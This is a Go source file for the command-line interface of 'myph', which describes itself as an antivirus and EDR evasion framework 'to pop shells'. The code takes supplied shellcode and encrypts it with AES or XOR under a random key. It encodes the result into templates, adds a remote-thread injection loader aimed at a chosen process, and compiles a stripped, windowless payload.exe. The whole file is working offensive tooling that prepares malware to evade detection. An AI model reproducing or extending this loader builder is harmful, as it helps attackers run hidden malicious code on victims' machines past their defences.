package cli

import (
	"fmt"
	"os"
	"os/exec"

	"github.com/cmepw/myph/loaders"
	"github.com/cmepw/myph/tools"
	"github.com/spf13/cobra"
)

const ASCII_ART = `
              ...                                    -==[ M Y P H ]==-
             ;::::;
           ;::::; :;                                In loving memory of
         ;:::::'   :;                           Wassyl Iaroslavovytch Slipak
        ;:::::;     ;.
       ,:::::'       ;           OOO                   (1974 - 2016)
       ::::::;       ;          OOOOO
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;::::::::: . ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO        AV / EDR evasion framework
; :::::: '::::::;;;::::: ,#/  /          DOOO           to pop shells and
: ::::::: ;::::::;;::: ;::#  /            DOOO        make the blue team cry
:: ::::::: ;:::::::: ;::::# /              DOO
 : ::::::: ;:::::: ;::::::#/               DOO
 ::: ::::::: ;; ;:::::::::##                OO       written with <3 by djnn
 :::: ::::::: ;::::::::;:::#                OO                ------
 ::::: ::::::::::::;' :;::#                O             https://djnn.sh
   ::::: ::::::::;  /  /  :#
   :::::: :::::;   /  /    #


    `


func GetParser(opts *Options) *cobra.Command {

	version := "2.0.0"
	var cmd = &cobra.Command{
		Use:                "myph",
		Version:            version,
		DisableSuggestions: true,
		Short:              "AV/EDR evasion framework",
		Long:               ASCII_ART,
		Run: func(cmd *cobra.Command, args []string) {

            fmt.Printf("%s\n\n", ASCII_ART)

			if opts.ShellcodePath == "" {
				fmt.Println("[!] Please specify your shellcode's path with --shellcode")
				os.Exit(1)
			}

			/* later, we will call "go build" on a golang project, so we need to set up the project tree */
			err := tools.CreateTmpProjectRoot(opts.Outdir)
			if err != nil {
				fmt.Printf("[!] Error generating project root: %s", err)
				os.Exit(1)
			}

			/* reading the shellcode as a series of bytes */
			shellcode, err := tools.ReadFile(opts.ShellcodePath)
			if err != nil {
				fmt.Printf("[!] Error reading shellcode file: %s", err)
				os.Exit(1)
			}

			/* i got 99 problems but generating a random key aint one */
			if opts.Key == "" {
				opts.Key = tools.RandomString(32)
			}

            fmt.Printf("[+] Selected algorithm: %s (Key: %s)\n", opts.Encryption.String(), opts.Key)

			/* encoding defines the way the series of bytes will be written into the template */
			encType := tools.SelectRandomEncodingType()

            fmt.Printf("\tEncoding into template with [%s]\n", encType.String())

			/*
			   depending on encryption type, we do the following:

			   - encrypt shellcode with key
			   - write both encrypted & key to file
			   - write to encrypt.go
			   - write to go.mod the required dependencies
			*/

			var encrypted = []byte{}
			var template = ""

			switch opts.Encryption {
			case EncKindAES:
				encrypted, err = tools.EncryptAES(shellcode, []byte(opts.Key))
				if err != nil {
					fmt.Println("[!] Could not encrypt with AES")
					panic(err)
				}
				template = tools.GetAESTemplate()

			case EncKindXOR:
				encrypted, err = tools.EncryptXOR(shellcode, []byte(opts.Key))
				if err != nil {
					fmt.Println("[!] Could not encrypt with XOR")
					panic(err)
				}
				template = tools.GetXORTemplate()
			}

			/* write decryption routine template */
			err = tools.WriteToFile(opts.Outdir, "encrypt.go", template)
			if err != nil {
				panic(err)
			}

			/* write main execution template */
			encodedShellcode := tools.EncodeForInterpolation(encType, encrypted)
			encodedKey := tools.EncodeForInterpolation(encType, []byte(opts.Key))
			err = tools.WriteToFile(opts.Outdir, "main.go", tools.GetMainTemplate(encType.String(), encodedKey, encodedShellcode))
			if err != nil {
				panic(err)
			}

			/* TODO: add support for more exec templates */
			err = tools.WriteToFile(opts.Outdir, "exec.go", loaders.GetCRTTemplate(opts.Target))

			os.Setenv("GOOS", opts.OS)
			os.Setenv("GOARCH", opts.arch)

            fmt.Printf("\n[+] Template (CRT) written to tmp directory. Compiling...\n")

			execCmd := exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
			execCmd.Dir = opts.Outdir

			_, stderr := execCmd.Output()

			if stderr != nil {
                fmt.Printf("[!] error compiling shellcode: %s\n", stderr.Error())
				os.Exit(1)
			}

            println("[+] Done! You may find your payload in the out-directory...")
		},
	}

	defaults := GetDefaultCLIOptions()

	cmd.PersistentFlags().StringVarP(&opts.Outdir, "outdir", "f", defaults.Outdir, "output directory")
	cmd.PersistentFlags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
    cmd.PersistentFlags().StringVarP(&opts.Target, "process", "p", defaults.Target, "target process to inject shellcode to")

	cmd.PersistentFlags().StringVarP(&opts.arch, "arch", "r", defaults.arch, "architecture compilation target")
	cmd.PersistentFlags().StringVarP(&opts.OS, "os", "o", defaults.OS, "OS compilation target")

	cmd.PersistentFlags().VarP(&opts.Encryption, "encryption", "e", "encryption method. (allowed: AES, RSA, XOR)")
	cmd.PersistentFlags().StringVarP(&opts.Key, "key", "k", "", "encryption key, auto-generated if empty. (if used by --encryption)")

	return cmd
}
